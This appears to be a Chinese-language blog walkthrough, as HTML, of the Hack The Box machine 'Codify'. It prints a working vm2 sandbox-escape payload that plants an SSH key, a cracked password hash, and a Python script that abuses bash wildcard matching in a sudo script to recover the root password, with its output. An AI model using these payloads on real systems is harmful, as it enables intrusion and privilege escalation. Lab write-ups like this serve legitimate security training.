@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      HTB-codify 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">HTB-codify</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-12-05 17:36:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">
+                    <b>#</b> 渗透
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/RedTeam/" title="RedTeam">
+                    <b>#</b> RedTeam
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/HTB/" title="HTB">
+                    <b>#</b> HTB
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集">#</a> 信息收集</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -v -oN nmap.log 10.10.11.239</span><br></pre></td></tr></table></figure>
+<p>扫描结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)</span><br><span class="line">|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://codify.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-title: Codify</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>然后看 80 页面，什么内容都没有</p>
+<p>接着看 3000 端口</p>
+<p>页面有说明，是 Node.js 沙盒环境，应该是让我们执行逃逸代码</p>
+<p>github 上找到一个新的 vm2 沙盒逃逸漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20240109165840655.png" alt="image-20240109165840655"></p>
+<p>成功执行</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20240109165919880.png" alt="image-20240109165919880"></p>
+<p>下面就要获取服务器权限了</p>
+<p>这里直截了当通过覆写公钥到服务器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const &#123;VM&#125; = require(&quot;vm2&quot;);</span><br><span class="line">const vm = new VM();</span><br><span class="line"></span><br><span class="line">const code = `</span><br><span class="line">err = &#123;&#125;;</span><br><span class="line">const handler = &#123;</span><br><span class="line">    getPrototypeOf(target) &#123;</span><br><span class="line">        (function stack() &#123;</span><br><span class="line">            new Error().stack;</span><br><span class="line">            stack();</span><br><span class="line">        &#125;)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line">const proxiedErr = new Proxy(err, handler);</span><br><span class="line">try &#123;</span><br><span class="line">    throw proxiedErr;</span><br><span class="line">&#125; catch (&#123;constructor: c&#125;) &#123;</span><br><span class="line">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cd ~/;mkdir .ssh;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClC3wrRzNZXoHc/NXHzAFLbPGkROcP8qadteSU9uDpLwPx2wRSzbwxuFh3qog7/T9Hn47amvQARv/xDO7GUBzdxkHw2arNM6ZpRYKRgqqYLY2azMIcfHb3g3HO/rWCW8d2Hd32TrjWEJgfxcwTYc9Um4blleU4f2y2XLyNvuaWD6jHbUXPR7QAvz868uIjqV4g63Bnmz8bz1xXEnNlICnMWLa2WWKr01jpU3cy5+pb2DKTbTZgjlwX37TxWi9WmtBuKgP5HccySeeToLirwnG6zQlH+DeNX5sA2aI1xUm1R+U+wmtHL54JU46rzbZ26YvblyCJLqabi28gtoV2hksGnTDwwg4hlQkKP93w4rig0q1s3AiLEhrJdOZ0rgGSNsTrvGiiqk7XTqIPkZgsPDpZsyMvL6fXP3pVpJCOYvPf9+Ml6zwKDI1fOuFuq2ZgOtoELEghYmYgU0uDn1khHPB5FU2fbyWzh1IsLWO3sILGP5jOeml9sjQdX3aEywAPAuE= ki10moc@192.168.0.101&quot; &gt; ~/.ssh/authorized_keys;ls -al ~/.ssh;cat ~/.ssh/auth*&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line">console.log(vm.run(code));</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20240109201616484.png" alt="image-20240109201616484"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh svc@10.10.11.239 -i id_rsa</span><br></pre></td></tr></table></figure>
+<p>获取到 shell</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20240109202542811.png" alt="image-20240109202542811"></p>
+<p>发现还有一个 joxxx 用户</p>
+<p>先找下配置文件之类的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/www/contact/tickets.db</span><br><span class="line">/var/lib/plocate/plocate.db</span><br><span class="line">/var/lib/fwupd/pending.db</span><br><span class="line">/var/lib/PackageKit/transactions.db</span><br><span class="line">/var/lib/command-not-found/commands.db</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /var/www/contact/tickets.db</span><br></pre></td></tr></table></figure>
+<p>在 tickets.db 中发现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SQLite format 3</span><br><span class="line">otableticketstickets</span><br><span class="line">CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P</span><br><span class="line">Ytablesqlite_sequencesqlite_sequence</span><br><span class="line">CREATE TABLE sqlite_sequence(name,seq)</span><br><span class="line">	tableusersusers</span><br><span class="line">CREATE TABLE users (</span><br><span class="line">        id INTEGER PRIMARY KEY AUTOINCREMENT, </span><br><span class="line">        username TEXT UNIQUE, </span><br><span class="line">        password TEXT</span><br><span class="line">    ))</span><br><span class="line">indexsqlite_autoindex_users_1users</span><br><span class="line"><span class="meta prompt_">joshua$</span><span class="language-bash">2a$12<span class="variable">$SOn8Pf6z8fO</span>/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</span></span><br><span class="line">joshua</span><br><span class="line">users</span><br><span class="line">tickets</span><br><span class="line">Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open</span><br><span class="line">Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>配置文件记录了 joshua 用户的 hash</p>
+<p>john 或者 hashcat 爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿ki10Moc)-[/]</span><br><span class="line">└─# john --show hash.txt </span><br><span class="line">?:spongebob1</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">joshua@codify:/home$ id</span><br><span class="line">uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)</span><br><span class="line">joshua@codify:/home$ </span><br></pre></td></tr></table></figure>
+<p>下面想办法提权到 root</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>看到一个 sh 脚本有 root 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">DB_USER=&quot;root&quot;</span><br><span class="line">DB_PASS=$(/usr/bin/cat /root/.creds)</span><br><span class="line">BACKUP_DIR=&quot;/var/backups/mysql&quot;</span><br><span class="line"></span><br><span class="line">read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS</span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line">if [[ $DB_PASS == $USER_PASS ]]; then</span><br><span class="line">        /usr/bin/echo &quot;Password confirmed!&quot;</span><br><span class="line">else</span><br><span class="line">        /usr/bin/echo &quot;Password confirmation failed!&quot;</span><br><span class="line">        exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;</span><br><span class="line"></span><br><span class="line">databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)</span><br><span class="line"></span><br><span class="line">for db in $databases; do</span><br><span class="line">    /usr/bin/echo &quot;Backing up database: $db&quot;</span><br><span class="line">    /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;All databases backed up successfully!&quot;</span><br><span class="line">/usr/bin/echo &quot;Changing the permissions&quot;</span><br><span class="line">/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;</span><br><span class="line">/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;</span><br><span class="line">/usr/bin/echo &#x27;Done!&#x27;</span><br></pre></td></tr></table></figure>
+<p>这里利用 johnua 用户登陆数据库看下 root 信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u &#x27;johnua&#x27; -h 0.0.0.0 -P 3306 -p</span><br><span class="line">use mysql;</span><br><span class="line">select * from user\G;</span><br></pre></td></tr></table></figure>
+<p>得到 root 的密码 hash，但是这里加了 salt，跑不出来，只能暴力破解了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: localhost</span><br><span class="line">User: root</span><br><span class="line">Password: *4ECCEBD05161B6782081E970D9D2C72138197218</span><br></pre></td></tr></table></figure>
+<p>回头接着看 sh 脚本</p>
+<p>这里发现密码匹配使用 ==，在 Bash 中使用 [[]] 中的 == 所致，它执行模式匹配而不是直接字符串比较。这意味着用户输入 （USER_PASS） 被视为一种模式，如果它包含 * 或 ？等通配字符，则它可能会匹配意外的字符串。</p>
+<p>如果实际密码是 password，但是用户输入 * 作为其密码，则模式匹配将成功，因为 * 匹配任何字符串，从而导致未经授权的访问。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">p</span>):</span><br><span class="line">	command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;p&#125;</span>*&#x27; | sudo /opt/scripts/mysql-backup.sh&quot;</span></span><br><span class="line">	result = subprocess.run(command, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Password confirmed!&quot;</span> <span class="keyword">in</span> result.stdout</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">is_password_found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_password_found:</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">		<span class="keyword">if</span> check_password(password + char):</span><br><span class="line">			password += char</span><br><span class="line">			<span class="built_in">print</span>(password)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		is_password_found = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">joshua@codify:/tmp$ vim 1.py </span><br><span class="line">joshua@codify:/tmp$ python3 1.py </span><br><span class="line">[sudo] password for joshua: </span><br><span class="line">k</span><br><span class="line">kl</span><br><span class="line">klj</span><br><span class="line">kljh</span><br><span class="line">kljh1</span><br><span class="line">kljh12</span><br><span class="line">kljh12k</span><br><span class="line">kljh12k3</span><br><span class="line">kljh12k3j</span><br><span class="line">kljh12k3jh</span><br><span class="line">kljh12k3jha</span><br><span class="line">kljh12k3jhas</span><br><span class="line">kljh12k3jhask</span><br><span class="line">kljh12k3jhaskj</span><br><span class="line">kljh12k3jhaskjh</span><br><span class="line">kljh12k3jhaskjh1</span><br><span class="line">kljh12k3jhaskjh12</span><br><span class="line">kljh12k3jhaskjh12k</span><br><span class="line">kljh12k3jhaskjh12kj</span><br><span class="line">kljh12k3jhaskjh12kjh</span><br><span class="line">kljh12k3jhaskjh12kjh3</span><br><span class="line">joshua@codify:/tmp$ su root</span><br><span class="line">Password: </span><br><span class="line">root@codify:/tmp# </span><br></pre></td></tr></table></figure>
+<p>最终提权道 root</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/11/21/PCL-Final%E5%A4%8D%E7%9B%98/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-12-05 17:36:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">
+                        <b>#</b> 渗透
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/RedTeam/" title="RedTeam">
+                        <b>#</b> RedTeam
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/HTB/" title="HTB">
+                        <b>#</b> HTB
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/12/11/S2-066%E5%88%86%E6%9E%90/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 信息收集</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
